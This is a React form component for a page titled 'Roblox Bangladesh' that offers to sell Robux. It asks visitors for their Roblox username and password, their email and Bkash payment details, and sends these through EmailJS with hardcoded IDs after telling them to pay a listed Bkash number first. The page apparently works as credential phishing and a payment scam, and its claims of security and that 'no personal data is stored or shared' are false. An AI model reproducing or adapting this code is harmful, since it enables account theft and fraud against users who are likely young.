import React, { useState } from "react";
import banner1 from "../../public/banner/banner1.jpg";
import banner2 from "../../public/banner/banner1.png";
import emailjs from "emailjs-com";

const Form = () => {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
    email: "",
    bkashDigits: "",
    robuxAmount: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs
      .send(
        "service_v784q1r", // Replace with your EmailJS Service ID
        "template_x06iuc9", // Replace with your EmailJS Template ID
        {
          RobloxUsername: formData.username,
          Password: formData.password,
          Email: formData.email,
          BkashLastDigits: formData.bkashDigits,
          RobuxAmount: formData.robuxAmount,
        },
        "B3iJoM6Tp-1O3_c7k" // Replace with your EmailJS User ID
      )
      .then(
        (response) => {
          alert("Form submitted successfully!");
          console.log("SUCCESS!", response.status, response.text);
        },
        (error) => {
          alert("Failed to send form data. Please try again.");
          console.error("FAILED...", error);
        }
      );
  };

  return (
    <div className="">
      <section className="bg-white ">
        <div className="lg:grid lg:min-h-screen lg:grid-cols-12 ">
          {/* Left Section */}
          <section className="relative flex h-32 items-end bg-gray-900 lg:col-span-5 lg:h-full xl:col-span-6">
            <img
              alt=""
              src={banner1}
              className="absolute inset-0 h-full w-full object-cover md:opacity-15 opacity-60"
            />
            <div className="hidden lg:relative lg:block lg:p-12 m-auto">
              <h2 className="mt-6 text-2xl font-bold text-white sm:text-3xl md:text-5xl">
                Welcome to Roblox Bangladesh
              </h2>
              <div>
                {/* Trust and Security */}
                <div className="trust_and_security text-white font-arimo font-bold my-5">
                  <h2 className="text-[40px]">Trust and Security</h2>
                  <ul className="list-disc text-lg font-arimo">
                    <li>Transactions follow Roblox's Terms of Service.</li>
                    <li>Payments are encrypted and secure.</li>
                    <li>No personal data is stored or shared.</li>
                    <li>Verified and trusted seller.</li>
                    <li>24/7 support available.</li>
                  </ul>
                </div>
                {/* Delivery Info */}
                <div className="trust_and_security text-white font-arimo font-bold my-5">
                  <h2 className="text-[40px]">Delivery Information</h2>
                  <ul className="list-disc text-lg font-arimo">
                    <li>Instant delivery after payment.</li>
                    <li>Log into the correct Roblox account.</li>
                    <li>Codes sent via email or Roblox messages.</li>
                    <li>Prompt support for delays.</li>
                    <li>Double-check your Roblox username.</li>
                  </ul>
                  <div className="note w-[500px] mt-4">
                    <h2 className="text-red-500 text-2xl font-bold">
                      Note: You have to Send Payment First And Submit The Form
                      With Proper Details
                    </h2>

                    <h3 className="mt-3 text-red-500 text-4xl ">
                      Bkash: 01754929680
                    </h3>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Form Section */}
          <main className="flex items-center justify-center px-8 py-8 sm:px-12 lg:col-span-7 lg:px-16 lg:py-12 xl:col-span-6 ">
            <div className="max-w-xl lg:max-w-3xl ">
              <div className="relative ml-12  md:ml-0 -mt-16 block lg:hidden">
                <a
                  className="inline-flex size-16 items-center justify-center rounded-full  bg-black text-blue-600 sm:size-20 overflow-hidden"
                  href="#"
                >
                  <img className="" src={banner2} alt="" />
                </a>

                <div className="text  md:pl-8  ">
                  <div className="trust_and_security text-black font-arimo font-bold my-7 pl-5 md:pl-0">
                    <h2 className="md:text-[40px] text-xl">
                      Trust and Security
                    </h2>
                    <ul className="list-disc md:text-lg text-sm font-arimo">
                      <li>Transactions follow Roblox's Terms of Service.</li>
                      <li>Payments are encrypted and secure.</li>
                      <li>No personal data is stored or shared.</li>
                      <li>Verified and trusted seller.</li>
                      <li>24/7 support available.</li>
                    </ul>
                  </div>

                  <div className="trust_and_security text-black font-arimo font-bold  pl-5 md:pl-0">
                    <h2 className="md:text-[40px] text-xl">
                      Delivery Information
                    </h2>
                    <ul className="list-disc md:text-lg text-sm font-arimo">
                      <li>Instant delivery after payment.</li>
                      <li>Log into the correct Roblox account.</li>
                      <li>Codes sent via email or Roblox messages.</li>
                      <li>Prompt support for delays.</li>
                      <li>Double-check your Roblox username.</li>
                    </ul>
                    <div className="note w-[400px] mt-4">
                      <h2 className="text-red-500 text-lg w-[336px] font-bold">
                        Note: You have to Send Payment First And Submit The Form
                        With Proper Details
                      </h2>

                      <h3 className="mt-3 text-red-500 ">Bkash: 01754929680</h3>
                    </div>
                  </div>
                </div>
              </div>

              <form
                onSubmit={handleSubmit}
                className="mt-1 grid grid-cols-6 gap-6 outline-none p-12 md:p-0"
              >
                <div className="col-span-6 sm:col-span-3">
                  <label className="block text-lg font-medium text-black">
                    Roblox Username
                  </label>
                  <input
                    type="text"
                    name="username"
                    value={formData.username}
                    onChange={handleChange}
                    className="w-full rounded-md border-gray-200 bg-white text-sm shadow-sm py-4 border pl-3 mt-3 outline-none"
                    placeholder="Roblox Username"
                    required
                  />
                </div>

                <div className="col-span-6 sm:col-span-3">
                  <label className="block text-lg font-medium text-black">
                    Password
                  </label>
                  <input
                    type="text"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    className="w-full rounded-md border-gray-200 bg-white text-sm shadow-sm py-4 border pl-3 mt-3 outline-none"
                    placeholder="Password"
                    required
                  />
                </div>

                <div className="col-span-6">
                  <label className="block text-lg font-medium text-black">
                    Email
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleChange}
                    className="w-full rounded-md border-gray-200 bg-white text-sm shadow-sm py-4 border pl-3 mt-3 outline-none"
                    placeholder="Enter Your Email"
                    required
                  />
                </div>

                <div className="col-span-6 sm:col-span-3">
                  <label className="block text-lg font-medium text-black">
                    Bkash Last 2-digit Number
                  </label>
                  <input
                    type="text"
                    name="bkashDigits"
                    value={formData.bkashDigits}
                    onChange={handleChange}
                    className="w-full rounded-md border-gray-200 bg-white text-sm shadow-sm py-4 border pl-3 mt-3 outline-none"
                    placeholder="Last 2 digits"
                    required
                  />
                </div>

                <div className="col-span-6 sm:col-span-3">
                  <label className="block text-lg font-medium text-black">
                    Robux Amount
                  </label>
                  <input
                    type="number"
                    name="robuxAmount"
                    value={formData.robuxAmount}
                    onChange={handleChange}
                    className="w-full rounded-md border-gray-200 bg-white text-sm shadow-sm py-4 border pl-3 mt-3 outline-none"
                    placeholder="Robux Amount"
                    required
                  />
                </div>

                <div className="col-span-6 sm:flex sm:items-center sm:gap-4">
                  <button
                    type="submit"
                    className="inline-block rounded-md border bg-blue-600 px-12 py-3 text-sm font-medium text-white hover:bg-transparent hover:text-blue-600"
                  >
                    Submit
                  </button>
                </div>
              </form>
            </div>
          </main>
        </div>
      </section>
    </div>
  );
};

export default Form;
